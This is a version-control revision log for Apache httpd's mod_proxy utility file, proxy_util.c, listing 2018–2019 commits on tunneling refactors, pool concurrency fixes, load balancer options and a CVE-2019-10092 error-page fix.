(5 years, 2 months ago)
by *ylavic*

File length: 155922 byte(s)

Diff to [previous 1868296](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1868296&r2=1869338)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1868296&r2=1869338&diff_format=h))
```
mod_proxy: factorize mod_proxy_{connect,wstunnel} tunneling code in proxy_util.

This commit adds struct proxy_tunnel_rec that contains the fields needed for a
poll() loop through the filters chains, plus functions ap_proxy_tunnel_create()
and ap_proxy_tunnel_run() to respectively initialize a tunnel and (re)start it.

Proxy connect and wstunnel modules now make use of this new API to avoid
duplicating logic and code.

```

---

Revision [**1868296**](/viewvc?view=revision&revision=1868296) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1868296&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1868296&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1868296))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1868296)

Modified
*Fri Oct 11 15:11:40 2019 UTC*
(5 years, 3 months ago)
by *rpluem*

File length: 148212 byte(s)

Diff to [previous 1868295](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1868295&r2=1868296)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1868295&r2=1868296&diff_format=h))
```
Fix pool concurrency problems

Create a subpool of the connection pool for worker scoped DNS resolutions.
This is needed to avoid race conditions in using the connection pool by multiple
threads during ramp up.

Recheck after obtaining the lock if we still need to do things or if they
were already done by another thread while we were waiting on the lock.

* modules/proxy/proxy_util.c: Create a subpool of the connection pool for worker
  scoped DNS resolutions and use it.

* modules/proxy/mod_proxy.h: Define AP_VOLATILIZE_T and add dns_pool to
  struct proxy_conn_pool.

* modules/proxy/mod_proxy_ftp.c: Use dns_pool and consider that
  worker->cp->addr is volatile in this location of the code.

PR: 63503

```

---

Revision [**1868295**](/viewvc?view=revision&revision=1868295) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1868295&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1868295&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1868295))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1868295)

Modified
*Fri Oct 11 14:40:10 2019 UTC*
(5 years, 3 months ago)
by *rpluem*

File length: 147044 byte(s)

Diff to [previous 1868294](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1868294&r2=1868295)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1868294&r2=1868295&diff_format=h))
```
* Add back logging goodness

Add back logging goodness added by covener in [r1865938](/viewvc?view=revision&revision=1865938).

```

---

Revision [**1868294**](/viewvc?view=revision&revision=1868294) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1868294&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1868294&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1868294))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1868294)

Modified
*Fri Oct 11 14:36:32 2019 UTC*
(5 years, 3 months ago)
by *rpluem*

File length: 147033 byte(s)

Diff to [previous 1866145](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1866145&r2=1868294)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1866145&r2=1868294&diff_format=h))
```
* Revert [r1865944](/viewvc?view=revision&revision=1865944) and [r1865938](/viewvc?view=revision&revision=1865938)

Revert [r1865944](/viewvc?view=revision&revision=1865944) and [r1865938](/viewvc?view=revision&revision=1865938) in order to provide a better patch with less
locking and thus contention.

lognos

PR63503: fix pool concurrency problems in mod_proxy

reslist and resolver related calls could concurrently access the same pool.

Submitted By: Don Poitras <Don.Poitras sas.com>
Committed By: covener

```

---

Revision [**1866145**](/viewvc?view=revision&revision=1866145) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1866145&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1866145&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1866145))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1866145)

Modified
*Fri Aug 30 11:58:41 2019 UTC*
(5 years, 4 months ago)
by *covener*

File length: 148216 byte(s)

Diff to [previous 1865944](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1865944&r2=1866145)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1865944&r2=1866145&diff_format=h))
```
restore use of global mutex under !APR_HAS_THREADS

followup to [r1852442](/viewvc?view=revision&revision=1852442) which appears to have been too agressive in wrapping
blocks with #if APR_HAS_THREADS.  With !APR_HAS_THREADS a global mutex
is a proc mutex.

```

---

Revision [**1865944**](/viewvc?view=revision&revision=1865944) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1865944&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1865944&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1865944))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1865944)

Modified
*Mon Aug 26 15:09:00 2019 UTC*
(5 years, 5 months ago)
by *covener*

File length: 148243 byte(s)

Diff to [previous 1865938](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1865938&r2=1865944)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1865938&r2=1865944&diff_format=h))
```
lognos

```

---

Revision [**1865938**](/viewvc?view=revision&revision=1865938) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1865938&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1865938&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1865938))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1865938)

Modified
*Mon Aug 26 14:19:31 2019 UTC*
(5 years, 5 months ago)
by *covener*

File length: 148213 byte(s)

Diff to [previous 1865937](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1865937&r2=1865938)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1865937&r2=1865938&diff_format=h))
```
PR63503: fix pool concurrency problems in mod_proxy

reslist and resolver related calls could concurrently access the same pool.

Submitted By: Don Poitras <Don.Poitras sas.com>
Committed By: covener

```

---

Revision [**1865937**](/viewvc?view=revision&revision=1865937) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1865937&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1865937&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1865937))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1865937)

Modified
*Mon Aug 26 14:07:08 2019 UTC*
(5 years, 5 months ago)
by *covener*

File length: 147060 byte(s)

Diff to [previous 1864693](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1864693&r2=1865937)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1864693&r2=1865937&diff_format=h))
```
remove APR_HAS_THREADS check

no need to wrap these after [r1865936](/viewvc?view=revision&revision=1865936)

```

---

Revision [**1864693**](/viewvc?view=revision&revision=1864693) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1864693&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1864693&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1864693))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1864693)

Modified
*Thu Aug 8 12:03:14 2019 UTC*
(5 years, 5 months ago)
by *jorton*

File length: 147114 byte(s)

Diff to [previous 1864191](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1864191&r2=1864693)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1864191&r2=1864693&diff_format=h))
```
* modules/proxy/proxy_util.c (ap_proxy_share_balancer): Create the
  nonce as a pseudo-UUID using the PRNG.

```

---

Revision [**1864191**](/viewvc?view=revision&revision=1864191) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1864191&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1864191&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1864191))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1864191)

Modified
*Fri Aug 2 01:27:37 2019 UTC*
(5 years, 5 months ago)
by *covener*

File length: 146978 byte(s)

Diff to [previous 1859713](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1859713&r2=1864191)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1859713&r2=1864191&diff_format=h))
```
remove request details from error documents (CVE-2019-10092).

```

---

Revision [**1859713**](/viewvc?view=revision&revision=1859713) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1859713&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1859713&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1859713))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1859713)

Modified
*Wed May 22 09:54:05 2019 UTC*
(5 years, 8 months ago)
by *rpluem*

File length: 147151 byte(s)

Diff to [previous 1859422](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1859422&r2=1859713)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1859422&r2=1859713&diff_format=h))
```
* Fix the logic to follow the comment. So far we only forwarded the header if
  we have NOT used it AND the env variable was set. But if we have not
  used it we should forward it in any case independent of the env variable
  setting.
  This aligns also with the behaviour in ap_proxy_create_hdrbrgd.

```

---

Revision [**1859422**](/viewvc?view=revision&revision=1859422) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1859422&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1859422&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1859422))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1859422)

Modified
*Fri May 17 08:42:17 2019 UTC*
(5 years, 8 months ago)
by *ylavic*

File length: 147149 byte(s)

Diff to [previous 1856829](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1856829&r2=1859422)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1856829&r2=1859422&diff_format=h))
```
Follow up to [r1859371](/viewvc?view=revision&revision=1859371): extend to other ap_proxy_connection_create[_ex]() users.

This function now now handles SSL reuse as well as the "proxy-request-hostname"
note (SNI), so let's also call it unconditionnaly in all proxy modules.

On the mod_ssl side, since this note has the lifetime of the connection, don't
reset/unset it during handshake (ssl_io_filter_handshake).

```

---

Revision [**1856829**](/viewvc?view=revision&revision=1856829) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1856829&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1856829&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1856829))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1856829)

Modified
*Tue Apr 2 15:00:43 2019 UTC*
(5 years, 9 months ago)
by *jim*

File length: 146940 byte(s)

Diff to [previous 1855646](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1855646&r2=1856829)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1855646&r2=1856829&diff_format=h))
```
Fix for: [Bug 62372] Load balancer byrequests required when bytraffic chosen

```

---

Revision [**1855646**](/viewvc?view=revision&revision=1855646) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1855646&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1855646&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1855646))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1855646)

Modified
*Sat Mar 16 13:45:17 2019 UTC*
(5 years, 10 months ago)
by *ylavic*

File length: 146864 byte(s)

Diff to [previous 1852442](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1852442&r2=1855646)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1852442&r2=1855646&diff_format=h))
```
mod_proxy/ssl: cleanup per-request SSL configuration for recycled proxy conns.

The SSL dir config of proxy/backend connections is stored in r->per_dir_config
but those connections have a lifetime independent of the requests they handle.

So we need to allow the external ssl_engine_set() function to reset mod_ssl's
dir config in between proxy requests, or the first sslconn->dc could be used
after free for the next requests.

mod_proxy can then reset/reinit the request config when recycling its backend
connections.

PR 63256.

```

---

Revision [**1852442**](/viewvc?view=revision&revision=1852442) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1852442&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1852442&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1852442))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1852442)

Modified
*Tue Jan 29 12:28:35 2019 UTC*
(5 years, 11 months ago)
by *stsp*

File length: 146291 byte(s)

Diff to [previous 1837250](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1837250&r2=1852442)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1837250&r2=1852442&diff_format=h))
```
Make proxy modules compile if APR_HAS_THREADS is not defined.

```

---

Revision [**1837250**](/viewvc?view=revision&revision=1837250) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1837250&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1837250&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1837250))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1837250)

Modified
*Wed Aug 1 18:53:53 2018 UTC*
(6 years, 5 months ago)
by *jailletc36*

File length: 146048 byte(s)

Diff to [previous 1836648](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1836648&r2=1837250)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1836648&r2=1837250&diff_format=h))
```
If ProxyPassReverse is used for reverse mapping of relative redirects, subsequent ProxyPassReverse statements, whether they are relative or absolute, may fail.

PR 60408 [Peter Haworth <pmh1wheel gmail.com>]

```

---

Revision [**1836648**](/viewvc?view=revision&revision=1836648) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1836648&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1836648&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1836648))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1836648)

Modified
*Wed Jul 25 16:33:44 2018 UTC*
(6 years, 6 months ago)
by *ylavic*

File length: 145931 byte(s)

Diff to [previous 1836603](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1836603&r2=1836648)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1836603&r2=1836648&diff_format=h))
```
mod_proxy_http: follow up to [r1836588](/viewvc?view=revision&revision=1836588): avoid 100-continue responses from core.

When mod_proxy_http handles end-to-end "100 continue", it can't let
ap_http_filter() send its own interim response whenever the body is read.

So save/restore r->expecting_100 before/after handling the request, and use
req->expecting_100 internally (including to restore r->expecting appropriately).

While at it, add comments and debug logs about 100 continue handling, and
fill in missing APLOGNO()s from [r1836588](/viewvc?view=revision&revision=1836588).

```

---

Revision [**1836603**](/viewvc?view=revision&revision=1836603) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1836603&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1836603&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1836603))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1836603)

Modified
*Wed Jul 25 06:22:53 2018 UTC*
(6 years, 6 months ago)
by *rpluem*

File length: 146229 byte(s)

Diff to [previous 1836381](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1836381&r2=1836603)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1836381&r2=1836603&diff_format=h))
```
* ap_proxy_balancer_get_best_worker cannot be exported and used as an optional
  function at the same time. So rename ap_proxy_balancer_get_best_worker to
  proxy_balancer_get_best_worker and make it static which is then used as an
  optional function and recreate ap_proxy_balancer_get_best_worker as an
  exported thin wrapper of proxy_balancer_get_best_worker.

```

---

Revision [**1836381**](/viewvc?view=revision&revision=1836381) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1836381&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1836381&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1836381))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1836381)

Modified
*Fri Jul 20 19:27:31 2018 UTC*
(6 years, 6 months ago)
by *rpluem*

File length: 145552 byte(s)

Diff to [previous 1834012](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1834012&r2=1836381)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1834012&r2=1836381&diff_format=h))
```
* mod_proxy: Remove load order and link dependency between mod_lbmethod_*
  modules and mod_proxy by providing mod_proxy's ap_proxy_balancer_get_best_worker
  as an optional function.

PR: 62557

```

---

Revision [**1834012**](/viewvc?view=revision&revision=1834012) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1834012&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1834012&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1834012))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1834012)

Modified
*Thu Jun 21 13:28:51 2018 UTC*
(6 years, 7 months ago)
by *jim*

File length: 145487 byte(s)

Diff to [previous 1832951](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1832951&r2=1834012)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1832951&r2=1834012&diff_format=h))
```
Add default schema ports for websockets
PR:62480
Lubos Uhliarik <luhliari@redhat.com>

```

---

Revision [**1832951**](/viewvc?view=revision&revision=1832951) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1832951&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1832951&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1832951))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1832951)

Modified
*Tue Jun 5 14:47:52 2018 UTC*
(6 years, 7 months ago)
by *jorton*

File length: 145412 byte(s)

Diff to [previous 1832280](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1832280&r2=1832951)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1832280&r2=1832951&diff_format=h))
```
* modules/proxy/proxy_util.c (ap_proxy_share_worker): Skip creating subpool
  for debugging unless debug-level logging is enabled.  No functional change.

```

---

Revision [**1832280**](/viewvc?view=revision&revision=1832280) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1832280&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1832280&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1832280))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1832280)

Modified
*Fri May 25 22:27:53 2018 UTC*
(6 years, 8 months ago)
by *jailletc36*

File length: 145379 byte(s)

Diff to [previous 1828890](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1828890&r2=1832280)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1828890&r2=1832280&diff_format=h))
```
In 'ap_proxy_cookie_reverse_map', iterate over each token of the 'Set-Cookie' header field in order to avoid updating the wrong one.

This could happen if the header field has something like 'fakepath=foo;path=bar". In this case fakepath would be updated instead of path.

We don't need regex anymore in order to parse the field values and 'ap_proxy_strmatch_domain' and 'ap_proxy_strmatch_path' are now useless. (and should be axed IMHO)

PR 61560

```

---

Revision [**1828890**](/viewvc?view=revision&revision=1828890) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1828890&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1828890&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1828890))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1828890)

Modified
*Wed Apr 11 12:11:05 2018 UTC*
(6 years, 9 months ago)
by *jhriggs*

File length: 145046 byte(s)

Diff to [previous 1826313](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1826313&r2=1828890)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1826313&r2=1828890&diff_format=h))
```
mod_proxy_balancer: Add hot spare member type and corresponding flag (R). Hot spare members are
used as drop-in replacements for unusable workers in the same load balancer set. This differs
from hot standbys which are only used when all workers in a set are unusable. PR 61140.

```

---

Revision [**1826313**](/viewvc?view=revision&revision=1826313) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1826313&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1826313&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1826313))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1826313)

Modified
*Fri Mar 9 09:36:18 2018 UTC*
(6 years, 10 months ago)
by *ylavic*

File length: 140741 byte(s)

Diff to [previous 1826289](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1826289&r2=1826313)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1826289&r2=1826313&diff_format=h))
```
Follow up to [r1609680](/viewvc?view=revision&revision=1609680): further simplify/optimize ap_proxy_strcmp_ematch().

While at it, same treatment for its mother ap_strcmp_match().

```

---

Revision [**1826289**](/viewvc?view=revision&revision=1826289) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1826289&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1826289&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1826289))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1826289)

Modified
*Thu Mar 8 23:23:30 2018 UTC*
(6 years, 10 months ago)
by *ylavic*

File length: 140787 byte(s)

Diff to [previous 1824482](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1824482&r2=1826289)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1824482&r2=1826289&diff_format=h))
```
Follow up to [r1609680](/viewvc?view=revision&revision=1609680): simpler/faster ap_proxy_strcmp_ematch().

No functional change.

```

---

Revision [**1824482**](/viewvc?view=revision&revision=1824482) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1824482&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1824482&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1824482))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1824482)

Modified
*Fri Feb 16 13:52:47 2018 UTC*
(6 years, 11 months ago)
by *minfrin*

File length: 140781 byte(s)

Diff to [previous 1824460](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1824460&r2=1824482)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1824460&r2=1824482&diff_format=h))
```
Set the notice when hostname is too long for legacy proxy modules to info level.

```

---

Revision [**1824460**](/viewvc?view=revision&revision=1824460) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1824460&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1824460&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1824460))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1824460)

Modified
*Fri Feb 16 12:55:49 2018 UTC*
(6 years, 11 months ago)
by *minfrin*

File length: 140783 byte(s)

Diff to [previous 1824176](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1824176&r2=1824460)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1824176&r2=1824460&diff_format=h))
```
Tone down the message that worker hostname is too long noting it only
affects legacy modules not yet using hostname_ex.

```

---

Revision [**1824176**](/viewvc?view=revision&revision=1824176) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1824176&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1824176&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1824176))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1824176)

Modified
*Tue Feb 13 21:22:05 2018 UTC*
(6 years, 11 months ago)
by *minfrin*

File length: 140711 byte(s)

Diff to [previous 1823482](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1823482&r2=1824176)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1823482&r2=1824176&diff_format=h))
```
mod_proxy: Provide an RFC1035 compliant version of the hostname in the
proxy_worker_shared structure. PR62085

```

---

Revision [**1823482**](/viewvc?view=revision&revision=1823482) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1823482&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1823482&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1823482))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1823482)

Modified
*Wed Feb 7 15:38:23 2018 UTC*
(6 years, 11 months ago)
by *jim*

File length: 140496 byte(s)

Diff to [previous 1822883](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822883&r2=1823482)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822883&r2=1823482&diff_format=h))
```
too-long worker schemes and/or hostnames are no longer fatal errors

```

---

Revision [**1822883**](/viewvc?view=revision&revision=1822883) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822883&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822883&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1822883))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1822883)

Modified
*Thu Feb 1 15:41:49 2018 UTC*
(6 years, 11 months ago)
by *ylavic*

File length: 140298 byte(s)

Diff to [previous 1822879](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822879&r2=1822883)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822879&r2=1822883&diff_format=h))
```
mod_proxy: follow up to [r1822849](/viewvc?view=revision&revision=1822849) and [r1822879](/viewvc?view=revision&revision=1822879).

Fix my maths, thanks Stefan and Rüdiger!

```

---

